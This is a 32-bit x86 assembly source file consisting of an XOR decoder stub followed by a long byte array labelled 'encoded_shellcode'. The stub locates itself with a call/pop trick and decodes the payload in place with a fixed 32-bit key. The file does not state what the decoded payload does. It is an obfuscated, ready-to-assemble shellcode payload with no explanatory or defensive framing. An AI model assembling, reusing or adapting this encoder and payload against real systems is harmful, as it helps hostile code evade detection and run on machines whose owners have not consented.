[SECTION .text]

BITS 32

global _start

_start:
    xor ecx, ecx
    sub ecx, 0xffffff84
    call $+4
    ret 
    pop esi
    decoding_loop:
        xor dword [esi+0xe], 0xa9b4a1d7
        sub esi, 0xfffffffc
        loop decoding_loop

    encoded_shellcode: db  0xe6, 0x68, 0x85, 0x5f, 0xb3, 0x2a, 0x81, 0x99, 0xd7, 0xa1, 0xb4, 0x22, 0xa1, 0xad, 0x39, 0xd7, 0xcb, 0x2a, 0xc2, 0xb5, 0x5a, 0xe7, 0xa8, 0x41, 0x5d, 0xa0, 0xb4, 0xa9, 0xea, 0x44, 0xa3, 0x47, 0x5b, 0xd4, 0xb9, 0x22, 0x89, 0xa9, 0x3d, 0xf4, 0x2b, 0x66, 0xf1, 0x51, 0xd6, 0xa1, 0xb4, 0xa9, 0x5c, 0x97, 0x8d, 0x57, 0xa2, 0x7f, 0x3f, 0xf4, 0x2b, 0x90, 0x66, 0xfb, 0x6d, 0x64, 0xa5, 0x88, 0xc0, 0x20, 0x46, 0x20, 0xaf, 0xe2, 0xd1, 0xfb, 0x6d, 0xec, 0xa8, 0x9e, 0x87, 0x20, 0x46, 0xa8, 0xa4, 0xf7, 0x80, 0xfb, 0x5e, 0xc4, 0x40, 0x40, 0x4, 0xa1, 0xb4, 0xa9, 0x54, 0x65, 0xbc, 0x13, 0xc3, 0xc4, 0xe2, 0x9d, 0x56, 0x53, 0xcc, 0xa0, 0x81, 0x95, 0xe6, 0x13, 0x28, 0x87, 0xcc, 0xff, 0x56, 0x53, 0x24, 0xe1, 0x81, 0x93, 0xe6, 0x13, 0xbd, 0x10, 0x9d, 0x2b, 0x56, 0x53, 0xab, 0x6a, 0x92, 0x4e, 0xe6, 0xfd, 0x28, 0x71, 0x4b, 0xec, 0x2f, 0x28, 0x77, 0x2a, 0x13, 0xad, 0x85, 0x7b, 0x85, 0x1b, 0xc2, 0x88, 0x4b, 0x20, 0x35, 0x5b, 0xce, 0xc6, 0x41, 0x44, 0x85, 0x1b, 0x4b, 0xaf, 0xcb, 0xb0, 0x35, 0x5b, 0x47, 0xc6, 0xcc, 0xec, 0x85, 0x1b, 0x4b, 0x52, 0xc4, 0xf2, 0x35, 0x5b, 0x47, 0x2d, 0xc9, 0x96, 0x85, 0x1b, 0x92, 0x9e, 0xba, 0xd1, 0x35, 0x5b, 0xa4, 0xc4, 0x95, 0x9d, 0x85, 0x28, 0xd1, 0x5d, 0x3c, 0xc8, 0x37, 0x6d, 0xcf, 0x48, 0x4f, 0xa9, 0xd7, 0xa1, 0xee, 0x20, 0x1, 0x90, 0x7d, 0x23, 0x83, 0xaf, 0xb5, 0x99, 0xc3, 0xaf, 0xe, 0x58, 0x69, 0xc, 0x6a, 0x28, 0x25, 0x4e, 0xa, 0x4, 0x9, 0xe0, 0x8d, 0x78, 0xa2, 0x48, 0x34, 0x9d, 0xd9, 0x28, 0x85, 0x7b, 0x85, 0xc9, 0x9a, 0xcc, 0xaf, 0xc4, 0xdc, 0xcf, 0xb6, 0xca, 0xd1, 0x20, 0x30, 0xf3, 0xe6, 0xfe, 0x81, 0xf3, 0x4b, 0x79, 0x54, 0x65, 0xa4, 0x56, 0x92, 0x59, 0x3f, 0xf4, 0x2b, 0x1b, 0xe5, 0x48, 0xcb, 0x81, 0x35, 0x5b, 0xd6, 0x32, 0xc7, 0xea, 0x85, 0x1b, 0x1e, 0xf9, 0x8e, 0xac, 0x35, 0x5b, 0x38, 0x89, 0x84, 0xd0, 0x85, 0x28, 0xd1, 0x5d, 0x3c, 0xa4, 0x85, 0x7b, 0x85, 0x5e, 0x64, 0x22, 0x94, 0x9d, 0xb5, 0x71, 0x5c, 0xe1, 0xcc, 0xa8, 0xf, 0x2a, 0xfc, 0x8d, 0xd6, 0x78, 0x3d, 0xe4, 0x3f, 0x2a, 0xcc, 0x89, 0xd6, 0x7e, 0x3d, 0xd4, 0x33, 0x2a, 0xe4, 0xb5, 0xd6, 0x7b, 0x3d, 0xfc, 0x37, 0x2a, 0xe4, 0xbd, 0xe6, 0x61, 0x3f, 0xd4, 0x33, 0x2a, 0xc1, 0x5d, 0xe6, 0x68, 0x48, 0x22, 0xeb, 0x26, 0xb5, 0x76, 0x54, 0xdc, 0x4c, 0xab, 0xa2, 0xa7, 0xd2, 0x2a, 0x16, 0xb1, 0x5f, 0xad, 0xb1, 0x22, 0x75, 0xa1, 0x24, 0x7, 0xc0, 0xac, 0x97, 0x98, 0x64, 0xdb, 0xe, 0x2a, 0xf9, 0x41, 0x5c, 0xf4, 0x54, 0xcf, 0x5c, 0xa5, 0xf5, 0x22, 0xd3, 0x23, 0xb5, 0x71, 0x54, 0xdc, 0x4c, 0xa8, 0xd8, 0x25, 0x72, 0x57, 0x28, 0x5e, 0x37, 0xd4, 0x2f, 0xa3, 0xbb, 0x2d, 0xf1, 0x5e, 0x4b, 0x56, 0x54, 0xdc, 0x4c, 0xaa, 0xa3, 0x25, 0xe2, 0x98, 0x5, 0x2a, 0xbc, 0x28, 0x36, 0x5e, 0x4b, 0xa9, 0xd7, 0xd5, 0xb3, 0x22, 0xa7, 0xa5, 0x85, 0x69, 0x7b, 0xe8, 0x75, 0x6b, 0xd2, 0x85, 0x6b, 0xa8, 0x15, 0xd, 0xfd, 0xdc, 0x22, 0x28, 0x64, 0xf7, 0x14, 0x49, 0xb4, 0x56, 0x28, 0x5e, 0x41, 0x1a, 0x28, 0x1f, 0x4d, 0x7d, 0x4a, 0x51, 0x5, 0x76, 0x41, 0x59, 0x28, 0x5c, 0x41, 0x56, 0x37, 0x45, 0x49, 0x70, 0x3, 0x5d, 0x4c, 0x57, 0x32, 0x5d, 0x4c, 0x57, 0x2b, 0x45, 0x5e, 0xa1, 0xb4, 0xa9
